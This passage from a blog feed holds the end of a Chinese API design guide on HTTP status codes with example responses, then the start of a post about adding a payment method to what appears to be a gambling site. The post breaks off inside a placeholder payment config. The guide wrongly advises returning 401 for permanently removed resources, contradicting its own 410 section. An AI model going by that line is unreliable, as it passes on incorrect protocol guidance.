<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">204</span> No Content</span><br><span class="line"><span class="attribute">Server</span>: nginx/<span class="number">1</span>.<span class="number">11</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Date</span>: Sun, <span class="number">24</span> Jun <span class="number">2018</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">12</span> GMT</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure>

<h3 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx 重定向"></a>3xx 重定向</h3><p>所有 API 一定不可 返回 3xx 类型的状态码。因为 3xx 类型的响应格式一般为下列格式:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:41:50 GMT</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://example.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0;url=https://example.com&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Redirecting to https://example.com<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">        Redirecting to <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span>&gt;</span>https://example.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>API 一定不可 返回纯 HTML 结构的响应；若一定要使用重定向功能，应该 返回一个响应实体为空的 3xx 响应，并在响应头中加上 Location 字段:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:52:50 GMT</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://godruoyi.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure>

<h3 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h3><p>由于明显的客户端错误（例如，请求语法格式错误、无效的请求、无效的签名等），服务器 应该 放弃该请求。</p>
<blockquote>
<p>当服务器无法从其他 4xx 类型的状态码中找出合适的来表示错误类型时，都 必须 返回该状态码。</p>
</blockquote>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 13:22:36 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">40000</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;无效的签名&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h3><p>该状态码表示当前请求需要身份认证，以下情况都 必须 返回该状态码。</p>
<ul>
<li>未认证用户访问需要认证的 API</li>
<li>access_token 无效/过期</li>
<li>客户端在收到 401 响应后，都 应该 提示用户进行下一步的登录操作。</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">401</span> Unauthorized</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">WWW-Authenticate</span><span class="punctuation">: </span>JWTAuth</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 13:17:02 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="1c"><span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token Signature could not be verified.&quot;</span>,<span class="string">&quot;error_code&quot;</span>: <span class="string">&quot;40100&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h3><p>该状态码可以简单的理解为没有权限访问该请求，服务器收到请求但拒绝提供服务。</p>
<p>如当普通用户请求操作管理员用户时，必须 返回该状态码。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">403</span> Forbidden</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 13:05:34 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">40301</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;权限不足&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h3><p>该状态码表示用户请求的资源不存在，如</p>
<ul>
<li>获取不存在的用户信息 （get /users/9999999）</li>
<li>访问不存在的端点</li>
</ul>
<p>都 必须 返回该状态码，若该资源已永久不存在，则 应该 返回 401 响应。</p>
<h3 id="405-Method-Not-Allowd"><a href="#405-Method-Not-Allowd" class="headerlink" title="405 Method Not Allowd"></a>405 Method Not Allowd</h3><p>当客户端使用的 HTTP 请求方法不被服务器允许时，必须 返回该状态码。</p>
<blockquote>
<p>如客户端调用了 POST 方法来访问只支持 GET 方法的 API</p>
</blockquote>
<p>该响应 必须 返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">405</span> Method Not Allowed</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Allow</span><span class="punctuation">: </span>GET, HEAD</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 12:30:57 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;405 Method Not Allowed&quot;</span>,<span class="attr">&quot;error_code&quot;</span>: <span class="number">40500</span>&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="406-Not-Acceptable"><a href="#406-Not-Acceptable" class="headerlink" title="406 Not Acceptable"></a>406 Not Acceptable</h3><p>API 在不支持客户端指定的数据格式时，应该返回此状态码。如支持 JSON 和 XML 输出的 API 被指定返回 YAML 格式的数据时。</p>
<blockquote>
<p>Http 协议一般通过请求首部的 Accept 来指定数据格式</p>
</blockquote>
<h3 id="408-Request-Timeout"><a href="#408-Request-Timeout" class="headerlink" title="408 Request Timeout"></a>408 Request Timeout</h3><p>客户端请求超时时 必须 返回该状态码，需要注意的时，该状态码表示 客户端请求超时，在涉及第三方 API 调用超时时，一定不可 返回该状态码。</p>
<h3 id="409-Gonfilct"><a href="#409-Gonfilct" class="headerlink" title="409 Gonfilct"></a>409 Gonfilct</h3><p>该状态码表示因为请求存在冲突无法处理。如通过手机号码提供注册功能的 API，当用户提交的手机号已存在时，必须 返回此状态码。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">409</span> Conflict</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 12:19:04 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">40900</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;手机号已存在&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="410-Gone"><a href="#410-Gone" class="headerlink" title="410 Gone"></a>410 Gone</h3><p>和 404 类似，该状态码也表示请求的资源不存在，只是 410 状态码进一步表示所请求的资源已不存在，并且未来也不会存在。在收到 410 状态码后，客户端 应该 停止再次请求该资源。</p>
<h3 id="413-Request-Entity-Too-Large"><a href="#413-Request-Entity-Too-Large" class="headerlink" title="413 Request Entity Too Large"></a>413 Request Entity Too Large</h3><p>该状态码表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。</p>
<blockquote>
<p>此种情况下，服务器可以关闭连接以免客户端继续发送此请求。</p>
</blockquote>
<p>如果这个状况是临时的，服务器 应该 返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。</p>
<h3 id="414-Request-URI-Too-Long"><a href="#414-Request-URI-Too-Long" class="headerlink" title="414 Request-URI Too Long"></a>414 Request-URI Too Long</h3><p>该状态码表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。</p>
<h3 id="415-Unsupported-Media-Type"><a href="#415-Unsupported-Media-Type" class="headerlink" title="415 Unsupported Media Type"></a>415 Unsupported Media Type</h3><p>通常表示服务器不支持客户端请求首部 Content-Type 指定的数据格式。如在只接受 JSON 格式的 API 中放入 XML 类型的数据并向服务器发送，都 应该 返回该状态码。</p>
<p>该状态码也可用于如：只允许上传图片格式的文件，但是客户端提交媒体文件非法或不是图片类型，这时 应该 返回该状态码：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">415</span> Unsupported Media Type</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 12:09:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">41500</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;不允许上传的图片格式&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="429-Too-Many-Request"><a href="#429-Too-Many-Request" class="headerlink" title="429 Too Many Request"></a>429 Too Many Request</h3><p>该状态码表示用户请求次数超过允许范围。如 API 设定为 60次/分钟，当用户在一分钟内请求次数超过 60 次后，都 应该 返回该状态码。并且也 应该 在响应首部中加上下列头部：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">X</span>-RateLimit-Limit: <span class="number">10</span> 请求速率（由应用设定，其单位一般为小时/分钟等，这里是 <span class="number">10</span>次/<span class="number">5</span>分钟）</span><br><span class="line"><span class="attribute">X</span>-RateLimit-Remaining: <span class="number">0</span> 当前剩余的请求数量</span><br><span class="line"><span class="attribute">X</span>-RateLimit-Reset: <span class="number">1529839462</span> 重置时间</span><br><span class="line"><span class="attribute">Retry</span>-After: <span class="number">120</span> 下一次访问应该等待的时间（秒）</span><br></pre></td></tr></table></figure>

<p>列子</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">429</span> Too Many Requests</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">X-RateLimit-Limit</span><span class="punctuation">: </span>10</span><br><span class="line"><span class="attribute">X-RateLimit-Remaining</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">X-RateLimit-Reset</span><span class="punctuation">: </span>1529839462</span><br><span class="line"><span class="attribute">Retry-After</span><span class="punctuation">: </span>290</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 11:19:32 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;You have exceeded your rate limit.&quot;</span>,<span class="attr">&quot;error_code&quot;</span>:<span class="number">42900</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>必须 为所有的 API 设置 Rate Limit 支持。</p>
<h3 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h3><p>该状态码 必须 在服务器出错时抛出，对于所有的 500 错误，都 应该 提供完整的错误信息支持，也方便跟踪调试。</p>
<h3 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h3><p>该状态码表示服务器暂时处理不可用状态，当服务器需要维护或第三方 API 请求超时/不可达时，都 应该 返回该状态码，其中若是主动关闭 API 服务，应该在返回的响应首部加上 Retry-After 头部，表示多少秒后可以再次访问。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">503</span> Service Unavailable</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 10:56:20 GMT</span><br><span class="line"><span class="attribute">Retry-After</span><span class="punctuation">: </span>60</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">50300</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;服务维护中&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>其他 HTTP 状态码请参考 <a href="https://link.juejin.im/?target=https://zh.wikipedia.org/zh-hans/HTTP%25E7%258A%25B6%25E6%2580%2581%25E7%25A0%2581">HTTP 状态码- 维基百科</a>。</p>
]]></content>
      <categories>
        <category>api</category>
      </categories>
      <tags>
        <tag>api</tag>
      </tags>
  </entry>
  <entry>
    <title>乐购菠菜添加支付方式</title>
    <url>/post/25578/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>突然有一天老板扔给我一个错误百出的文档（文档不规范，码农两行泪），让我往某不知名网站添加某不可描述支付</p>
<span id="more"></span>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
<li><p>登录后台发现有添加第三方支付的菜单，但是发现只能更改配置，无法添加新的支付方式（知道不会这么简单）</p>
</li>
<li><p>进入数据库发现数据存储在<code>payment_config</code>表中，试着直接数据库添加查看数据变化，添加后发现只能出现在支付列表中，无法添加和更改配置</p>
</li>
<li><p>查看页面请求，直接阅读获取支付代码，发现有一个<code>pay.json</code>的配置文件，直接打开，部分代码如下</p>
</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;nid&quot;</span>: <span class="string">&quot;nid_pay&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;请选择类型&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantID&quot;</span>: <span class="string">&quot;支付平台提供给商家的账号&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;terminalID&quot;</span>: <span class="string">&quot;支付平台提供给商家的终端号&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantKey&quot;</span>: <span class="string">&quot;支付平台提供个商家的密码（MD5加密时使用）&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPayKey&quot;</span>: <span class="string">&quot;支付有关的其他秘钥或信息&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;partnerId&quot;</span>: <span class="string">&quot;支付平台代理商账号&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPrivateKey&quot;</span>: <span class="string">&quot;用户私钥（与用户公钥成对存在）&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPublicKey&quot;</span>: <span class="string">&quot;用户公钥（与用户私钥成对存在）&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;platformPublicKey&quot;</span>: <span class="string">&quot;平台公钥（平台提供，一般在商户登录支付平台后台管理页面获取）&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantCertPath&quot;</span>: <span class="string">&quot;商家证书&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;platformCertPath&quot;</span>: <span class="string">&quot;平台证书&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;payBank&quot;</span>: [&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;ICBC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;ABC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">9</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;BOC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">7</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CCB&quot;</span>&#125;,</span><br><span class="line">        			&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">10</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;COMM&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">11</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CMB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">14</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;SPDB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">26</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CIB&quot;</span>&#125;,</span><br><span class="line">        			&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CMBC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">13</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;GDB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">12</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;SPDB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">8</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CEB&quot;</span>&#125;,</span><br><span class="line">        			&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">29</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;HXB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">3</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;PSBC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">6</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;PAB&quot;</span>&#125;</span><br><span class="line">    			],</span><br><span class="line">        <span class="attr">&quot;pay_layers&quot;</span>: <span class="string">&quot;1,2,3,5,4,6,7,8,9,10,11&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;payType&quot;</span>: [</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">1</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;微信扫码支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;支付配置信息&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;其他支付配置信息&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;端口类型：1=ios,2=android,3=h5,4=pc&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="string">&quot;是否启用：1:启用;2:禁用&quot;</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="string">&quot;返回数据or跳转页面：1：返回数据，2:跳转页面&quot;</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">2</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;微信WAP支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WX_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">3</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;微信H5支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WX_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">4</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;支付宝扫码支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;ALI&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">5</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;支付宝WAP支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;ALI_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">6</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;支付宝H5支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;ALI_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">7</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;QQ钱包扫码支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;QQ&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">8</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;QQ钱包WAP支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;QQ_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">9</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;QQ钱包H5支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;QQ_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">10</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;网银支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WY&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">11</span>,<span 